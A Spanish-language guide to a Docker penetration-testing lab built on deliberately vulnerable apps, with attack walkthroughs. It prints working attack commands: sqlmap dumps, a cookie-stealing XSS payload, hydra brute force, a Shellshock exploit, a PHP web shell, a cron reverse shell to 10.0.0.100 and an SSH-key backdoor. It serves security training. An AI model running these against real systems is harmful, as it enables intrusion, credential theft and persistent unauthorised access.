
# Guía Completa del Laboratorio de Penetración Testing

## Introducción

Este laboratorio de penetración testing está construido sobre el proyecto **apache-docker-project** y ha sido expandido para crear un entorno completo de pruebas de seguridad utilizando Docker. El laboratorio simula una infraestructura de red real con múltiples segmentos y aplicaciones vulnerables.

## Arquitectura del Laboratorio

### Segmentación de Red


┌─────────────────────────────────────────────────────────────────┐
│                    LABORATORIO DE PENETRACIÓN TESTING           │
├─────────────────┬─────────────────┬─────────────────┬──────────────┤
│   DMZ Network   │   LAN Network   │ Attacker Network│ Monitoring   │
│ 192.168.90.0/24 │ 192.168.1.0/24  │  10.0.0.0/24    │172.20.0.0/24 │
├─────────────────┼─────────────────┼─────────────────┼──────────────┤
│ -  Apache        │ -  MySQL DVWA    │ -  Kali Linux    │ -  ELK Stack  │
│ -  DVWA          │ -  MySQL Vuln    │ -  Metasploit    │ -  Logs       │
│ -  Juice Shop    │ -  Databases     │ -  Nmap          │ -  Monitoring │
│ -  WebGoat       │                 │ -  Burp Suite    │              │
│ -  Mutillidae    │                 │ -  Custom Tools  │              │
│ -  SSH Honeypot  │                 │                 │              │
│ -  FTP Vulnerable│                 │                 │              │
└─────────────────┴─────────────────┴─────────────────┴──────────────┘



### Servicios Disponibles

| Servicio | Puerto | Red | Descripción | Vulnerabilidades |
| :--      | :--    | :-- | :--         | :--              |
| Apache (PwotoSite.cl) | 80 | DMZ | Servidor web principal | Configuración básica |
| DVWA | 8080 | DMZ | Damn Vulnerable Web App | SQL Injection, XSS, CSRF |
| Juice Shop | 3000 | DMZ | OWASP Top 10 | Múltiples vulnerabilidades |
| WebGoat | 8081 | DMZ | OWASP WebGoat | Educacional, múltiples vulns |
| Mutillidae | 8082 | DMZ | OWASP Mutillidae | Amplias vulnerabilidades |
| SSH Honeypot | 2222 | DMZ | Cowrie SSH Honeypot | Monitoreo de ataques |
| FTP Vulnerable | 21 | DMZ | Servidor FTP inseguro | Credenciales débiles |
| MySQL Vulnerable | 3306 | LAN | Base de datos insegura | Múltiples vulnerabilidades |

## Configuración Inicial

### Prerrequisitos

1. **Docker Desktop** instalado y en ejecución
2. **Git** para clonar el repositorio
3. **10 GB** de espacio libre en disco
4. **8 GB** de RAM recomendada
5. **Permisos de administrador** para configurar firewall

### Instalación


# 1. Clonar el repositorio
git clone https://github.com/JosephJMRG/apache-docker-project.git
cd apache-docker-project

# 2. Hacer ejecutables los scripts
chmod +x lab-components/scripts/*.sh

# 3. Iniciar el laboratorio
./lab-components/scripts/lab-controller.sh start

# 4. Verificar el estado
./lab-components/scripts/lab-controller.sh status



### Configuración de Firewall

El laboratorio incluye configuración automática de iptables:


# Ejecutar con permisos de administrador
sudo ./lab-components/scripts/configure-firewall.sh



## Guía de Uso

### Escenarios de Penetración Testing

#### 1. Reconocimiento de Red

**Objetivo**: Descubrir servicios y hosts en la red objetivo.

**Herramientas**: Nmap, Masscan, Unicornscan

**Procedimiento**:


# Acceder al contenedor atacante
./lab-components/scripts/lab-controller.sh attack

# Escaneo de red DMZ
nmap -sn 192.168.90.0/24

# Escaneo de puertos
nmap -sS -sV -O 192.168.90.0/24

# Escaneo específico de servicios web
nmap -p 80,443,8080,3000,8081,8082 192.168.90.0/24

# Escaneo de vulnerabilidades
nmap --script vuln 192.168.90.0/24



#### 2. Análisis de Aplicaciones Web

**Objetivo**: Identificar vulnerabilidades en aplicaciones web.

**Herramientas**: Burp Suite, OWASP ZAP, Nikto, Dirb

**Procedimiento**:


# Escaneo básico con Nikto
nikto -h http://192.168.90.10

# Escaneo de directorios
dirb http://192.168.90.10

# Análisis con whatweb
whatweb http://192.168.90.10:8080

# Escaneo de formularios
python3 /tools/form-scanner.py http://192.168.90.10:8080



#### 3. Explotación de SQL Injection

**Objetivo**: Explotar vulnerabilidades de inyección SQL en DVWA.

**Herramientas**: SQLMap, Manual Testing

**Procedimiento**:


# Acceso a DVWA
curl -c cookies.txt http://192.168.90.10:8080/login.php

# Obtener token CSRF
curl -b cookies.txt http://192.168.90.10:8080/vulnerabilities/sqli/

# Prueba manual de SQL Injection
curl -b cookies.txt "http://192.168.90.10:8080/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit"

# Uso de SQLMap
sqlmap -u "http://192.168.90.10:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=xxx" --dbs

# Enumeración de tablas
sqlmap -u "http://192.168.90.10:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=xxx" -D dvwa --tables

# Extracción de datos
sqlmap -u "http://192.168.90.10:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=xxx" -D dvwa -T users --dump



#### 4. Cross-Site Scripting (XSS)

**Objetivo**: Explotar vulnerabilidades XSS en múltiples aplicaciones.

**Herramientas**: Manual Testing, XSS Hunter, BeEF

**Procedimiento**:


# XSS Reflejado en DVWA
curl -b cookies.txt "http://192.168.90.10:8080/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>"

# XSS Almacenado en DVWA
curl -b cookies.txt -d "txtName=<script>alert('Stored XSS')</script>&mtxMessage=Test&btnSign=Sign+Guestbook" http://192.168.90.10:8080/vulnerabilities/xss_s/

# XSS en Juice Shop
curl "http://192.168.90.10:3000/rest/user/login" -d '{"email":"<script>alert(1)</script>","password":"test"}'

# Payload avanzado para extracción de datos
curl -b cookies.txt "http://192.168.90.10:8080/vulnerabilities/xss_r/?name=<script>document.location='http://10.0.0.100:8000/'+document.cookie</script>"



#### 5. Ataque a Base de Datos

**Objetivo**: Explotar la base de datos MySQL vulnerable en la red LAN.

**Herramientas**: MySQL Client, Hydra, Medusa

**Procedimiento**:


# Intento de conexión directa
mysql -h 192.168.1.10 -u root -p

# Ataque de fuerza bruta
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.1.10

# Conexión con credenciales encontradas
mysql -h 192.168.1.10 -u root -p'root123'

# Enumeración de bases de datos
mysql -h 192.168.1.10 -u root -p'root123' -e "SHOW DATABASES;"

# Acceso a datos sensibles
mysql -h 192.168.1.10 -u root -p'root123' -e "USE vulnerable_db; SELECT * FROM users LIMIT 10;"

# Extracción de hashes de contraseñas
mysql -h 192.168.1.10 -u root -p'root123' -e "USE mysql; SELECT user,password FROM user;"



#### 6. Movimiento Lateral

**Objetivo**: Moverse desde la DMZ hacia la red LAN.

**Herramientas**: SSH Tunneling, Port Forwarding, Metasploit

**Procedimiento**:


# Desde un servicio comprometido en DMZ, intentar acceso a LAN
# (Normalmente bloqueado por firewall)

# Túnel SSH a través de servidor comprometido
ssh -L 3306:192.168.1.10:3306 compromised_user@192.168.90.10

# Port forwarding con Metasploit
use auxiliary/server/socks4a
set SRVPORT 1080
run

# Configurar proxy chains para acceder a LAN
echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT 192.168.1.0/24



#### 7. Análisis de Logs y Forense

**Objetivo**: Analizar logs de ataques y actividad del honeypot.

**Herramientas**: Log Analysis, Cowrie Logs

**Procedimiento**:


# Análisis de logs del honeypot SSH
docker exec ssh-honeypot cat /cowrie/var/log/cowrie/cowrie.log

# Análisis de logs de firewall
sudo tail -f /var/log/pentest-firewall.log

# Análisis de logs de Apache
docker exec apache-pwotosite tail -f /var/log/apache2/access.log

# Análisis de intentos de ataques
grep "BLOCKED-ATTACK" /var/log/kern.log

# Estadísticas de ataques
grep "SQL Injection" /var/log/apache2/access.log | wc -l



### Técnicas Avanzadas

#### 1. Bypass de Firewall

**Técnicas para evadir reglas de firewall**:


# Fragmentación de paquetes
nmap -f 192.168.90.10

# Uso de señuelos
nmap -D RND:10 192.168.90.10

# Timing evasion
nmap -T1 192.168.90.10

# Evasión de puertos
nmap --source-port 53 192.168.90.10

# Tunneling HTTP
httptunnel -F 192.168.90.10:80 -P 192.168.1.10:3306



#### 2. Explotación de Servicios

**Metasploit Framework**:


# Iniciar Metasploit
msfconsole

# Escaneo de vulnerabilidades
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.90.10
set RPORT 8080
run

# Explotación de Apache
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 192.168.90.10
set RPORT 80
exploit

# Post-explotación
use post/multi/recon/local_exploit_suggester
set SESSION 1
run



#### 3. Persistent Access

**Mantener acceso persistente**:


# Backdoor PHP
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php

# Cron job
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.100/4444 0>&1'" | crontab -

# SSH Key
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@kali" >> /root/.ssh/authorized_keys



## Configuración de Herramientas

### Burp Suite

1. **Configuración de Proxy**:
    - Proxy: 127.0.0.1:8080
    - Configurar browser para usar proxy
2. **Configuración de Target**:
    - Agregar 192.168.90.0/24 al scope
    - Configurar exclusiones si es necesario
3. **Configuración de Intruder**:
    - Cargar wordlists desde `/usr/share/wordlists/`
    - Configurar rate limiting

### OWASP ZAP


# Iniciar ZAP en modo daemon
zap.sh -daemon -host 0.0.0.0 -port 8090

# Configuración básica
zap-cli quick-scan --self-contained http://192.168.90.10:8080

# Escaneo completo
zap-cli active-scan http://192.168.90.10:8080



### Custom Tools

El laboratorio incluye herramientas personalizadas en `/tools`:


# Escáner de puertos personalizado
python3 /tools/port-scanner.py 192.168.90.0/24

# Brute forcer de formularios
python3 /tools/form-brute.py http://192.168.90.10:8080/login.php

# Extractor de información
python3 /tools/info-extractor.py http://192.168.90.10



## Monitoreo y Logging

### Configuración de Logs

El laboratorio genera logs en múltiples ubicaciones:


# Logs de aplicaciones web
docker logs dvwa-target
docker logs juice-shop-target
docker logs webgoat-target

# Logs de firewall
tail -f /var/log/pentest-firewall.log

# Logs de honeypot
docker exec ssh-honeypot tail -f /cowrie/var/log/cowrie/cowrie.log

# Logs de base de datos
docker exec mysql-vulnerable tail -f /var/log/mysql/error.log



### Análisis de Tráfico


# Captura de tráfico con tcpdump
tcpdump -i docker0 -w capture.pcap

# Análisis con Wireshark
wireshark capture.pcap

# Análisis de tráfico HTTP
tcpdump -i docker0 -A -s 10240 'port 80 or port 8080'



## Escenarios de Entrenamiento

### Nivel Principiante

1. **Reconocimiento básico**
    - Escaneo de puertos con nmap
    - Identificación de servicios
    - Análisis de headers HTTP
2. **Vulnerabilidades básicas**
    - SQL Injection en DVWA (nivel low)
    - XSS reflejado
    - Directory traversal
3. **Herramientas básicas**
    - Uso de Burp Suite
    - Nikto scanning
    - Manual testing

### Nivel Intermedio

1. **Explotación avanzada**
    - Blind SQL Injection
    - XSS persistente
    - CSRF attacks
    - File upload vulnerabilities
2. **Movimiento lateral**
    - Pivoting a través de servicios
    - Port forwarding
    - Tunneling
3. **Evasión de controles**
    - WAF bypass
    - Encoding/decoding
    - Timing attacks

### Nivel Avanzado

1. **Explotación compleja**
    - Chaining múltiples vulnerabilidades
    - Custom exploit development
    - Zero-day simulation
2. **Técnicas avanzadas**
    - Advanced persistent threats (APT)
    - Covert channels
    - Anti-forensics
3. **Red team operations**
    - Campañas completas
    - Social engineering integration
    - Custom malware development

## Troubleshooting

### Problemas Comunes

#### Contenedores no inician


# Verificar Docker
docker --version
docker info

# Verificar logs
docker-compose logs [servicio]

# Reiniciar Docker
sudo systemctl restart docker



#### Problemas de red


# Verificar redes
docker network ls
docker network inspect dmz_network

# Recrear redes
docker network rm dmz_network lan_network attacker_network
./lab-components/scripts/setup-networks.sh



#### Problemas de firewall


# Verificar reglas
sudo iptables -L DOCKER-USER -n -v

# Reconfigurar firewall
sudo ./lab-components/scripts/configure-firewall.sh

# Limpiar reglas
sudo iptables -F DOCKER-USER



#### Problemas de performance


# Verificar recursos
docker stats

# Limpiar recursos no utilizados
docker system prune

# Verificar espacio en disco
df -h



### Logs de Debug


# Habilitar debug en Docker
echo '{"debug": true}' | sudo tee /etc/docker/daemon.json
sudo systemctl restart docker

# Logs detallados
docker-compose --verbose up



## Seguridad y Consideraciones Legales

### ⚠️ ADVERTENCIAS IMPORTANTES

1. **Uso Exclusivo en Laboratorio**
    - Este laboratorio contiene vulnerabilidades REALES
    - NO utilizar en redes de producción
    - Mantener aislado de Internet cuando sea posible
2. **Consideraciones Legales**
    - Solo usar en sistemas propios
    - Obtener autorización escrita antes de pruebas
    - Respetar leyes locales de ciberseguridad
3. **Responsabilidad**
    - El usuario es responsable del uso adecuado
    - No usar para actividades maliciosas
    - Reportar vulnerabilidades reales responsablemente

### Mejores Prácticas

1. **Aislamiento**
    - Usar VMs o contenedores aislados
    - Configurar firewall apropiadamente
    - Monitorear tráfico de red
2. **Backup y Recuperación**
    - Hacer backup regular de configuraciones
    - Documentar cambios realizados
    - Mantener snapshots de estados limpios
3. **Actualización**
    - Mantener herramientas actualizadas
    - Seguir nuevas vulnerabilidades
    - Actualizar escenarios de prueba

## Recursos Adicionales

### Documentación

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [PTES Technical Guidelines](http://www.pentest-standard.org/)


### Herramientas

- [Kali Linux Tools](https://tools.kali.org/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)


### Comunidad

- [OWASP Local Chapters](https://owasp.org/chapters/)
- [DEF CON Groups](https://www.defcon.org/html/links/dc-groups.html)
- [2600 Meetings](https://www.2600.com/meetings/)


## Contribución

Para contribuir al proyecto:

1. Fork el repositorio
2. Crear branch para nueva funcionalidad
3. Implementar cambios con documentación
4. Crear pull request con descripción detallada

## Soporte

Para obtener soporte:

1. Revisar esta documentación
2. Consultar issues en GitHub
3. Crear nuevo issue con detalles completos
4. Contactar mantenedores del proyecto

---

**Última actualización**: Diciembre 2024
**Versión**: 1.0
**Autor**: JosephJMRG
**Licencia**: MIT (solo para uso educativo)

